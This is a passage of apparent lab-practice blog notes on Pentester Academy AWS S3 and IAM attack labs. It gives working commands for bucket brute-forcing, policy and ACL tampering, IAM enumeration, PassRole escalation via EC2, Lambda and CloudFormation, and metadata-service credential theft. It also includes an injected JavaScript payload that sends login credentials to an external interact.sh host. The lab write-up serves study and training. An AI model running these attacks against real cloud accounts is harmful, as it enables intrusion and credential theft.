curl request to download a backup of user data. This downloaded data contains a flag as well as user credentials.S3 Guessable ObjectThe Lab provides an endpoint which has a bucket public with a policy to allow retrieval of objects however, not for listing the buckets or objects. An existing key can be searched for within a brute force wordlist and attempting to curl them as follows →for i in $(cat /usr/share/dirb/wordlists/small.txt)docurl -s http://192.96.62.3:9000/public/$i | grep -vE \"(key does not exist)|(encoding)\"doneHardcoded CredentialsThe Lab provided credentials for a random IAM user who had general permissions to read the upload-xxx bucket but not the flag-xxx bucket. However, the upload-xxx bucket contained hardcoded AWS credentials which allows access as the admin user which had the permissions to read from all buckets and could therefore retrieve the flag.Readable Bucket PolicyThe lab gives a bucket that has the following bucket policy →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:GetBucketPolicy\", \"Resource\": \"arn:aws:s3:::s3-readable-policy-117119606323\" }, { \"Effect\": \"Deny\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:List*\", \"Resource\": \"arn:aws:s3:::s3-readable-policy-117119606323\" }, { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::s3-readable-policy-117119606323/this-is-flag\" } ]}This allows reading the this-is-flag object to everyone.Special RequestThe lab gives a bucket that has the following policy →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:GetBucketPolicy\", \"Resource\": \"arn:aws:s3:::s3-special-request-439586372472\" }, { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::s3-special-request-439586372472/flag\", \"Condition\": { \"StringLike\": { \"aws:UserAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*\" } } } ]}This allows reading the flag object if the request has a User Agent string as specified. Therefore, a curl request for the following can get the flag →curl https://s3-special-request-439586372472.s3.amazonaws.com/flag -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*\"Writable Bucket PolicyThe lab gives a bucket which has the following policy →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": [ \"s3:GetBucketPolicy\", \"s3:PutBucketPolicy\" ], \"Resource\": \"arn:aws:s3:::s3-writable-policy-555466747704\" }, { \"Effect\": \"Deny\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::s3-writable-policy-555466747704/flag\" } ]}The policy allows adding to i.e., modifying the bucket policy which can then be edited to remove the Deny rule for the flag object. The same policy can be used, except the Deny rule should be removed and the GetObject action added. Then apply the policy to the bucket as follows →awsn s3api put-bucket-policy --policy file://policy.json --bucket s3-writable-policy-555466747704The policy would now become →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": [ \"s3:GetBucketPolicy\", \"s3:PutBucketPolicy\" ], \"Resource\": \"arn:aws:s3:::s3-writable-policy-555466747704\" }, { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::s3-writable-policy-555466747704/flag\" } ]}Now, the flag object can be retrieved.Writable Bucket ACLThe lab provides a bucket which has it’s ACL set to the following →{ \"Owner\": { \"DisplayName\": \"jeswincloud+1615526435580\", \"ID\": \"53a8d91fd037af9e568205fb59b36cc80feabb24efe2fe0f8d1bddd86e409368\" }, \"Grants\": [ { \"Grantee\": { \"Type\": \"Group\", \"URI\": \"http://acs.amazonaws.com/groups/global/AuthenticatedUsers\" }, \"Permission\": \"READ_ACP\" }, { \"Grantee\": { \"Type\": \"Group\", \"URI\": \"http://acs.amazonaws.com/groups/global/AuthenticatedUsers\" }, \"Permission\": \"WRITE_ACP\" } ]}This allows all global authenticated AWS users to read and write the access control policy for the bucket. Therefore, a change can be made to the first grant such that the permission if READ instead of READ_ACP so that not only can the ACP but also the contents. This gives the secret bucket which can be used to read the flag. To apply the policy, the following is used →# policy.json holds the modified access control policyawsn s3api put-bucket-acl --bucket s3-secret-670128143243 --access-control-policy file://policy.jsonWritable Object ACLJust like the Writable Bucket ACL, this labs gives a bucket with a restricted ACL for the flag object. Th policy is similar to that of the bucket in previous lab but for the object. Changing the READ_ACP to READ can allow reading the object, however will disallow reading the access contorl policy. It can be updated as follows →awsn s3api put-object-acl --key flag --bucket s3-secret-357630943120 --access-control-policy file://policy.jsonThis allows reading the flag object.Guessable BucketThe lab gives an Ubuntu instance with an S3 endpoint. The buckets can be enumerated against a list of names by using a wordlist as follows →for i in $(cat /usr/share/dirb/wordlists/small.txt )do curl -s http://192.167.222.3:9000/$i | grep -vE \"(NoSuchBucket)|(specified bucket is not valid)\"; doneThis gives the bucket as secret and the flag can be retrieved as follows →curl -s http://192.167.222.3:9000/secret/FLAGChaining AttacksThe lab gives an IAM user who has some access to S3. There are two buckets and the static files store and the main bucket contents can be retrieved using the following command →# For static bucket, remove static to list for the other bucketawsn s3api list-objects --bucket s3-file-load-static-431664597780 | jq '.Contents[] | .Key'The bucket policy for the main website is hidden and not authorized for our user or anonymous users to edit however, the one for the static content is as follows →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"AllObjectActions\", \"Effect\": \"Allow\", \"Principal\": \"*\", \"Action\": [ \"s3:Get*\", \"s3:Put*\", \"s3:List*\" ], \"Resource\": [ \"arn:aws:s3:::s3-file-load-static-431664597780/*\", \"arn:aws:s3:::s3-file-load-static-431664597780\" ] } ]}Therefore, anyone can add to or edit the content. An example would be to carry out an XSS attack. The source code of the main website uses a custom.js code which is situated in the static content bucket. This can be edited due to the policy and introduce an XSS bug.List the javascript files in the static buckets using the following code →awsn s3api list-objects --bucket s3-file-load-static-431664597780 --prefix \"static/javascript\"The modified javascript file can be uploaded as follows →awsn s3api put-object --bucket s3-file-load-static-108536353935 --key \"static/javascript/custom.js\" --body custom.jsThe edited javascript can be seen below →function makeRequest() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;&amp; this.status == 200) { document.getElementById(\"output\").innerHTML = this.responseText; } if (this.readyState == 4 &amp;&amp; this.status != 200) { document.getElementById(\"output\").innerHTML = \"Invalid Credentials\"; } }; var url = 'https://ahyk95vfo5.execute-api.us-west-2.amazonaws.com/dev?username=' + $('#pi3').val() + '&amp;password=' + $('#pi4').val(); xhttp.open(\"GET\", url, true); xhttp.send(); document.getElementById(\"output\").innerHTML = \"&lt;img src='http://c9et0w32vtc0000btwzggrzpyqryyyyyb.interact.sh/creds?username=' + $('#pi3').val() + '&amp;password=' + $('#pi4').val() /&gt;\"; alert(\"XSS\");}Python Object StoreThe lab gives a web server running from S3 which has public access to listing the assets bucket which also contains information about sessions. Each session is represented by a token which basically holds the credentials of the service in a python pickle format. A payload for a reverse shell can be pickled in python and uploaded in place of the session such that when the web session reloads, the session will launch a reverse shell if the attacker machine is listening. With the shell, root privileges are obtained and can be used to retrieve the flag." }, { "title": "Pentester Academy AWS IAM Attack Lab", "url": "/blog/posts/pentester-academy-aws-iam/", "categories": "Lab Practice Notes, AWS Labs", "tags": "aws, lab, pentester-academy, iam, security", "date": "2022-04-28 03:00:00 -0400", "snippet": "EnumerationTo get information about current caller →awsn sts get-identity-caller List and see last uses for access keys → # List all access keys awsn iam list-access-keys # Get last usage ...", "content": "EnumerationTo get information about current caller →awsn sts get-identity-caller List and see last uses for access keys → # List all access keys awsn iam list-access-keys # Get last usage region and service which used the access key awsn iam get-access-key-last-used --access-key-id AKIAUAWOPGE5CTW6HRZL # List last service usage for all access keys for i in $(awsn iam list-access-keys | jq '.AccessKeyMetadata[] | .AccessKeyId' | tr -d \"\\\"\") do echo $i awsn iam get-access-key-last-used --access-key-id $i | jq '.AccessKeyLastUsed | .ServiceName' done Get information about the account → # Summary for the account awsn iam get-account-summary | jq '.SummaryMap' # Password Policy awsn iam get-account-password-policy # Get account aliases awsn iam list-account-aliases | jq '.AccountAliases' # Get a million lines - all information about the account # Best to save this in some file since the output is huge (~5MB) awsn iam get-account-authorization-details &gt; account_authorization_details Get information on groups → # Get list of all groups (direct) awsn iam list-groups | jq '.Groups[].GroupName' # Get list of all groups (from account_authorization_details) cat account_authorization_details | jq '.GroupDetailList[].GroupName' # Get managed policies for a group awsn iam list-attached-group-policies --group-name ad-Admin cat account_authorization_details | jq '.GroupDetailList[] | select(.GroupName == \"ad-Admin\") | .AttachedManagedPolicies' # Get group inline policies awsn iam list-group-policies --group-name Students-config-2 cat account_authorization_details | jq '.GroupDetailList[] | select(.GroupName == \"Students-config-2\") | .GroupPolicyList' # Get users in group awsn iam get-group --group-name Students-config-2 | jq '.Users' Get information on users → # Get list of users awsn iam list-users | jq '.Users[].UserName' cat account_authorization_details | jq '.UserDetailList[].UserName' # List policy for a user awsn iam list-user-policies --user-name student-mtn5imevkfls5pue awsn iam get-user-policy --user-name student-mtn5imevkfls5pue --policy-name DenyAccess cat account_authorization_details | jq '.UserDetailList[] | select(.UserName==\"student-mtn5imevkfls5pue\") | .UserPolicyList' # List attached managed policies for a user awsn iam list-attached-user-policies --user-name student-mtn5imevkfls5pue cat account_authorization_details | jq '.UserDetailList[] | select(.UserName==\"student-mtn5imevkfls5pue\") | .AttachedManagedPolicies' # List user tags for a user awsn iam list-user-tags --user-name ad-Adminson cat account_authorization_details | jq '.UserDetailList[] | select(.UserName==\"ad-Adminson\") | .Tags' # Get general user information awsn iam get-user --user-name ad-Adminson cat account_authorization_details | jq '.UserDetailList[] | select(.UserName==\"ad-Adminson\")' # List groups for user awsn iam list-groups-for-user --user-name ad-Adminson cat account_authorization_details | jq '.UserDetailList[] | select(.UserName==\"ad-Adminson\") | .GroupList' a=$(cat account_authorization_details | jq '.UserDetailList[] | select(.UserName==\"ad-Adminson\") | .GroupList[]' | tr -d \"\\\"\") for i in $(echo \"$a\"); do cat account_authorization_details | jq '.GroupDetailList[] | select(.GroupName == \"'\"$i\"'\")'; done Get login profiles for all users → for i in $(awsn iam list-users | jq '.Users[].UserName' | tr -d \"\\\"\") do echo \"$i -----------------\" awsn iam get-login-profile --user-name $i done Get information on roles → # List all roles awsn list-roles cat account_authorization_details | jq '.RoleDetailList[]' # Get information for a role awsn iam list-role-policies --role-name ad-Role awsn iam get-role --role-name ad-Role cat account_authorization_details | jq '.RoleDetailList[] | select(.RoleName == \"ad-Role\")' # Get policies for a role awsn iam list-role-policies --role-name ad-Role # gives names for the next command awsn iam get-role-policy --role-name ad-Role --policy-name ad-RoleDeneid cat account_authorization_details | jq '.RoleDetailList[] | select(.RoleName == \"ad-Role\") | .RolePolicyList' # List attached managed policies awsn iam list-attached-role-policies --role-name ad-Role cat account_authorization_details | jq '.RoleDetailList[] | select(.RoleName == \"ad-Role\") | .AttachedManagedPolicies' Get default version document for policy → cat account_authorization_details | \\ jq '.Policies[] | select(.PolicyName==\"AmazonDynamoDBFullAccess\") | .PolicyVersionList[] | select(.IsDefaultVersion==true) | .Document' List all policies in use → # Policies with attachment count more than 0 awsn iam list-policies | jq '.Policies[] | select(.AttachmentCount &gt; 0) | .PolicyName' cat account_authorization_details | jq '.Policies[].PolicyName' # Customer Managed policies awsn iam list-policies --scope Local # AWS Managed policies awsn iam list-policies --scope AWS List entities for a given policy → awsn iam list-entities-for-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess Get ssh-public keys and signing certificates for user → # List signing key certs for userawsn iam list-signing-certificates --user-name ad-user# Get ssh public keysawsn iam list-ssh-public-keys --user-name ad-user Get Roles which have Principal as any AWS account within the Assume Role policy document → cat account_authorization_details | \\jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS==\"*\") | .RoleName' Get information for MFA devices → # MFA devicesawsn iam list-mfa-devices# Virtual MFA devicesawsn iam list-virtual-mfa-devices Cross Account EnumerationThe old method of enumerating roles on a different account was to try to assume that role and look for discrepancies in the error response returned by the API. This was fixed by AWS Security and thus a new method is required.For the new method, a new role is created using the following in the personal account →awsn iam create-role --role-name tlullu --assume-role-policy-document file://policy.jsonThe policy document contains the following →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Deny\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"sts:AssumeRole\" } ]}This denies sts:AssumeRole to all AWS accounts. Now, if the policy is updated to deny it only for a specific ARN, then AWS backend will check to see if the entity actually exists. The update policy command fails if the entity is not valid (not present). Therefore, the principal can be changed to the following → \"AWS\": \"ad-doesnotexist\" or \"AWS\": \"ad-crow\" using the following command →aws iam update-assume-role-policy --role-name tlullu --policy-document file://policy.jsonThe command fails if the role doesn’t exist with the following error →An error occurred (MalformedPolicyDocument) when calling the UpdateAssumeRolePolicy operation: Invalid principal in policy: \"AWS\":\"arn:aws:iam::276384657722:role/ad-doesnotexist\"If the role exists, then the policy is updated successfully. This allows for role enumeration, after which they can be checked for wildcard principal for sts:AssumeRole by attempting to assume them. PACU does this automatically.Adding keys to PACU and running it from the prompt as follows →run iam__enum_roles --role-name tlullu --account-id 276384657722 --word-list /root/namesThis gives the following identified roles and whether they can be assumed globally or not → ad-crew ad-flea ad-ibex ad-snipe ad-griffonSince this works on entities, users can also be enumerated in the same way by specifying the ARN of a user instead of a role within the policy. PACU has this under the iam__enum_users module. Running that modules gives the following users → ad-ghoul ad-guppy ad-marmot ad-thrush ad-haddock ad-foxhound ad-honeybee ad-terrapinMisconfigured Trust PolicyThe Lab asks to assume a role in another account which can be done as follows →awsn sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name TestTanqThe output can be saved to a file assumed_role. Then the session can be used as follows →AWS_ACCESS_KEY_ID=$(cat assumed_role|jq '.Credentials.AccessKeyId'|tr -d \"\\\"\") \\AWS_SECRET_ACCESS_KEY=$(cat assumed_role|jq '.Credentials.SecretAccessKey'|tr -d \"\\\"\") \\AWS_SESSION_TOKEN=$(cat assumed_role|jq '.Credentials.SessionToken'|tr -d \"\\\"\") \\awsn sts get-caller-identityUsing this method to check the managed policies attached with the role, it’s seen that the role has read only access to S3 and IAM. The S3 buckets can be listed and the IAM assume role policy can be seen as well as follows →{ \"Role\": { \"Path\": \"/\", \"RoleName\": \"ad-LoggingRole\", \"RoleId\": \"AROAUAWOPGE5JQT23CRUN\", \"Arn\": \"arn:aws:iam::276384657722:role/ad-LoggingRole\", \"CreateDate\": \"2021-01-20T06:15:40+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600, \"RoleLastUsed\": { \"LastUsedDate\": \"2022-04-24T17:35:13+00:00\", \"Region\": \"us-east-1\" } }}The policy allows any AWS account to assume this role i.e., wildcard. This is bad.Overly Permissive Permission 1This lab provides a user in an AWS account and the objective is to obtain administrative privileges using an overly permissive permission.Listing the details of the user from UserDetailList, the student user has the following policies →{ \"Path\": \"/\", \"UserName\": \"student\", \"UserId\": \"AIDAS4LAHUW7BDJ6WXEI3\", \"Arn\": \"arn:aws:iam::198307194302:user/student\", \"CreateDate\": \"2022-04-25T01:50:49+00:00\", \"GroupList\": [], \"AttachedManagedPolicies\": [ { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" }, { \"PolicyName\": \"Service\", \"PolicyArn\": \"arn:aws:iam::198307194302:policy/Service\" } ], \"Tags\": []}The policy Service can be retrieved as follows →awsn iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::198307194302:policy/ServiceThis gives the following policy →{ \"PolicyVersion\": { \"Document\": { \"Statement\": [ { \"Action\": \"iam:AttachUserPolicy\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::*:user/*\" } ], \"Version\": \"2012-10-17\" }, \"VersionId\": \"v1\", \"IsDefaultVersion\": true, \"CreateDate\": \"2022-04-25T01:50:49+00:00\" }}This allows the user to attach arbitrary policies to any user. Thus, the administrator privileges can be granted to any user. In this instance, granting the Administrator policy to the student user can be done as follows →asd=$(awsn iam list-policies | jq '.Policies[] | select(.PolicyName == \"AdministratorAccess\") | .Arn' | tr -d \"\\\"\")awsn iam attach-user-policy --user-name student --policy-arn $asdThis solves the lab.Dangerous Policy Combination 1This lab gives an IAM user with the objective to leverage the policies attached to the student user and attain administrative privileges on the AWS account.Using the User detail list to check the policies for the student user →{ \"Path\": \"/\", \"UserName\": \"student\", \"UserId\": \"AIDAZNIQILDEKIBVNHP56\", \"Arn\": \"arn:aws:iam::646963550408:user/student\", \"CreateDate\": \"2022-04-25T02:37:36+00:00\", \"UserPolicyList\": [ { \"PolicyName\": \"terraform-20220425023745069800000002\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"sts:AssumeRole\" ], \"Effect\": \"Allow\", \"Resource\": [ \"arn:aws:iam::646963550408:role/Adder\", \"arn:aws:iam::646963550408:role/Attacher\" ] } ] } } ], \"GroupList\": [], \"AttachedManagedPolicies\": [ { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" } ], \"Tags\": []}Thus, the user can assume the two roles of Adder and Attacher. These policies can be retrieved from the respective roles using the Role detail list →{ \"Path\": \"/\", \"RoleName\": \"Adder\", \"RoleId\": \"AROAZNIQILDEGUAHO6ICH\", \"Arn\": \"arn:aws:iam::646963550408:role/Adder\", \"CreateDate\": \"2022-04-25T02:37:44+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"arn:aws:iam::646963550408:user/student\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"InstanceProfileList\": [], \"RolePolicyList\": [ { \"PolicyName\": \"AddUser\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": \"iam:AddUserToGroup\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::646963550408:group/Printers\" } ] } } ], \"AttachedManagedPolicies\": [], \"Tags\": [], \"RoleLastUsed\": {}}{ \"Path\": \"/\", \"RoleName\": \"Attacher\", \"RoleId\": \"AROAZNIQILDELXDKYIOZ2\", \"Arn\": \"arn:aws:iam::646963550408:role/Attacher\", \"CreateDate\": \"2022-04-25T02:37:44+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"arn:aws:iam::646963550408:user/student\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"InstanceProfileList\": [], \"RolePolicyList\": [ { \"PolicyName\": \"AttachPolicy\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": \"iam:AttachGroupPolicy\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::646963550408:group/Printers\" } ] } } ], \"AttachedManagedPolicies\": [], \"Tags\": [], \"RoleLastUsed\": {}}Therefore, the Adder role allows adding users to the group Printers and the Attacher policy allows attaching policies to the group Printers. Therefore, the escalation path is to add the AdministratorAccess policy to the Printers group and then add the student user to that group. This will grant us administrative privileges. Assume the roles and save the credentials output to assumed_role after which the commands can be invoked as follows →AWS_ACCESS_KEY_ID=$(cat assumed_role|jq '.Credentials.AccessKeyId'|tr -d \"\\\"\") \\ with root@cf9d78fcffc0AWS_SECRET_ACCESS_KEY=$(cat assumed_role|jq '.Credentials.SecretAccessKey'|tr -d \"\\\"\") \\AWS_SESSION_TOKEN=$(cat assumed_role|jq '.Credentials.SessionToken'|tr -d \"\\\"\") \\awsn iam add-user-to-group --group-name Printers --user-name studentSimilarly, repeat for Attacher and attach the policy using the following →# same env vars to use the assumed role sessionawsn iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --group-name PrintersDangerous Policy Combination 2This lab provided an IAM user in an AWS account and the objective was to gain administrative privileges.Looking at the users in IAM, using the User detail list, there are 2 users and only one with policies which is student. The student user has a policy to assume the roles of Adder and PolicyUpdater. Looking at these roles using the Role detail list, the Adder role can add a user to the Printers group while the PolicyUpdater role can create a new version for the policy Print.The Printers group has the Print policy attached to it. Therefore, path of escalation is to create a new version of the Print policy which allows administrator access to the Printers group and then add the student user to the Printers group.Therefore, assume role of Adder and add the user to the Printers group. Next, assume role of PolicyUpdater and create a new version for the Print policy using the standard administrative policy file. The create-policy-version subcommand also has a flag to make the new version default. This can be done as follows →awsn iam create-policy-version --policy-arn arn:aws:iam::871597022766:policy/Print --policy-document file://policy.json --set-as-defaultThis gives the student user administrative privileges. This also solves the lab.Overly Permissive Permission 2The lab provides an IAM user student within an AWS account with the objective of gaining administrative access on the account.Looking at the user detail list, there are 4 users → student which is us, identity which is useless, AdminBob and AdminJane which are the two admins,Upon looking at the policies, the student user has the following policy inline →{ \"PolicyName\": \"terraform-20220425212035034400000001\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:CreateLoginProfile\", \"iam:ChangePassword\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ] } }With this, a new login profile can be used on any user on the account. Therefore, a skeleton is created using the following command →awsn iam create-login-profile --generate-cli-skeleton &gt; create-login-profile.jsonThis creates a skeleton json file which can be edited as follows →{ \"UserName\": \"AdminBob\", \"Password\": \"Root00--123@\", \"PasswordResetRequired\": false}Then, the new login profile can be created using the following command →awsn iam create-login-profile --cli-input-json file://create-login-profile.jsonThis gives console access to the AdminBob user and therefore grants administrative privileges and solves the lab.Pass Role EC2The lab provides an IAM user student within an AWS account with the objective of gaining administrative access on the account.lab.logThe student user has the following policy →{ \"PolicyName\": \"ConfigureEC2Role\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"iam:PassRole\", \"ec2:RunInstances\", \"ec2:Describe*\", \"ec2:TerminateInstances\", \"ssm:*\" ], \"Resource\": \"*\" } ] }}Therefore, the user can perform PassRole on any resource as well as has control over EC2 instances and SSM (AWS Systems Manager). Therefore, the user should have the ability to pass a role to an EC2 instance and run it.Looking at available roles that can be passed using the role detail list, there is an ec2admin role that can be assumed by EC2 which has policies as follows →{ \"Path\": \"/\", \"RoleName\": \"ec2admin\", \"RoleId\": \"AROAQYAQFWV2XI23JRAW7\", \"Arn\": \"arn:aws:iam::051573536117:role/ec2admin\", \"CreateDate\": \"2022-04-26T00:00:05+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" }] }, \"InstanceProfileList\": [ { \"Path\": \"/\", \"InstanceProfileName\": \"ec2_admin\", \"InstanceProfileId\": \"AIPAQYAQFWV2Z3YJX2PCC\", \"Arn\": \"arn:aws:iam::051573536117:instance-profile/ec2_admin\", \"CreateDate\": \"2022-04-26T00:00:06+00:00\", \"Roles\": [ { \"Path\": \"/\", \"RoleName\": \"ec2admin\", \"RoleId\": \"AROAQYAQFWV2XI23JRAW7\", \"Arn\": \"arn:aws:iam::051573536117:role/ec2admin\", \"CreateDate\": \"2022-04-26T00:00:05+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"ec2.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" }]}}]} ], \"RolePolicyList\": [ { \"PolicyName\": \"terraform-20220426000006379000000003\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" }]}} ], \"AttachedManagedPolicies\": [], \"Tags\": [], \"RoleLastUsed\": {}}When the role is defined on the console to be assumed by EC2, an instance profile is automatically created by the backend to allow for the instance to assume that role. The only remaining step at that point is to allow an authorized user to pass a role to it. The policy attached to the above passable role is that of an administrative user.Several pieces of information are required to launch an EC2 instance. These can be gathered as follows → Get the AMI-ID to launch a machine and get the Image ID →awsn ec2 describe-images --owners \"amazon\" --filters \"Name=name,Values=amzn2-ami-hvm-*x86_64-gp2\" \"Name=state,Values=available\" \"Name=architecture,Values=x86_64\" | jq '.Images | sort_by(.CreationDate) | last(.[])' Get the available subnets and retrieve a Subnet ID →awsn ec2 describe-subnets Get the security group to associate with the instance. The Group ID is the field of importance. There were many security groups here, however, an interesting one was the sshAccesss SG which allowed SSH access from anywhere on the internet. This was not useful though, since the user did not have permissions to add an SSH key. So, any security group would suffice →awsn ec2 describe-security-groups The instance profile name can be obtained from the above Role detail as ec2_admin.Now, the instance can be launched using the following command →awsn ec2 run-instances --subnet-id \"subnet-0d3f2d36c562ea754\" --image-id \"ami-00db75007d6c5c578\" --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids \"sg-0cd10f19654a602f8\"This launched the instance and returns a bunch of information about it along with the instance ID, which is necessary to use when trying to execute things via SSM. The EC2 instance effectively has the assumed role of ec2admin. The next step is to get the credentials via the metadata service.Commands can be issued to the EC2 instance using SSM using the following →ssm send-command --targets \"Key=instanceids,Values=i-02930a6a3317e02e1\" --document-name \"AWS-RunShellScript\" --comment \"aws_cli_run_lab\" --parameters 'commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/\"]'This runs the command and returns an ID associated with the command invocation. The ID can be used to retrieve the output as follows →awsn ssm get-command-invocation --command-id 35218027-97f2-4b68-8495-aa78cb0e9065 --instance-id i-02930a6a3317e02e1This gives the output of the cURL command which contains the temporary credentials to assume the role that the EC2 instance has i.e., the ec2admin role. Then the following can be done to prove administrative privileges →AWS_ACCESS_KEY_ID=$(cat assumed_role|jq '.AccessKeyId'|tr -d \"\\\"\") \\AWS_SECRET_ACCESS_KEY=$(cat assumed_role|jq '.SecretAccessKey'|tr -d \"\\\"\") \\AWS_SESSION_TOKEN=$(cat assumed_role|jq '.Token'|tr -d \"\\\"\") \\awsn iam create-user --user-name BobThis solves the lab.Pass Role LambdaThe lab provides an IAM user student within an AWS account with the objective of gaining administrative access on the account.Looking at the users, the user of importance is student who has the inline policy to allow iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction, lambda:List*, lambda:Get* and lambda:Update* actions. Therefore, student has the ability to pass an existing role to a Lambda function.If such a role exists which can be passed to Lambda and has enough permissions to help escalate, that would solve the issue. This can be checked by looking at the policy detail list. Such a function can be found in the lab account. The command to do a quick search is as follows →cat account_authorization_details | jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service==\"lambda.amazonaws.com\")'This gives the following role →{ \"Path\": \"/\", \"RoleName\": \"lab11lambdaiam\", \"RoleId\": \"AROAVZBFEYFFM77TYJBLL\", \"Arn\": \"arn:aws:iam::397362381130:role/lab11lambdaiam\", \"CreateDate\": \"2022-04-26T19:11:46+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"lambda.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"InstanceProfileList\": [], \"RolePolicyList\": [ { \"PolicyName\": \"terraform-20220426191146909700000003\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:AttachUserPolicy\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ] } } ], \"AttachedManagedPolicies\": [], \"Tags\": [], \"RoleLastUsed\": {}}Therefore, the role has the permissions to attach a policy to any user. Therefore, the attack path is as follows → Write malicious code to build a Lambda function out of it such that the code grants the student user administrator privileges by assuming capabilities of the lab11lambdaiam role →# file name is lambda_exploit.pyimport boto3def lambda_handler(event, context): client = boto3.client('iam') response = client.attach_user_policy( UserName = 'student', PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess' ) return responseThis is then zipped to create a deployment bundle as follows →zip lambda_exploit.zip lambda_exploit.py Create a function by passing the lab11lambdaiam role to it using the malicious code →awsn lambda create-function --function-name lambda_exploit \\--runtime python3.8 --role \"arn:aws:iam::397362381130:role/lab11lambdaiam\" \\--handler \"lambda_exploit.lambda_handler\" --zip-file fileb://lambda_exploit.zip Invoke the Lambda function →# Invokeawsn lambda invoke --function-name lambda_exploit out --log-type Tail# Output will be in LogResult key in the returned JSON object.# LogResult is base64 encoded and the file out contains request parametersThese steps grant the administrator privileges to the student user and this can be verified by creating a new user or listing the attached policies again and comparing with user detail list. This solves the lab.Pass Role CloudFormationThe lab provides an IAM user student within an AWS account with the objective of gaining administrative access on the account.Looking at the user detail list, only student is of concern and has the following inline policy →{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:PassRole\", \"cloudformation:Describe*\", \"cloudformation:List*\", \"cloudformation:Get*\", \"cloudformation:CreateStack\", \"cloudformation:UpdateStack\", \"cloudformation:ValidateTemplate\", \"cloudformation:CreateUploadBucket\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ]}Therefore, the user can pass a role to a service, which has to CloudFormation as it is the only one which it can do most of the actions for. Therefore, the path of escalation would be to create a malicious IaC template in CFN and passing a role that can allow CFN to do malicious activities. To find such a role, looking at role detail list, there is one named lab12CFDeployRole which can also be searched for with the following command →cat account_authorization_details | jq 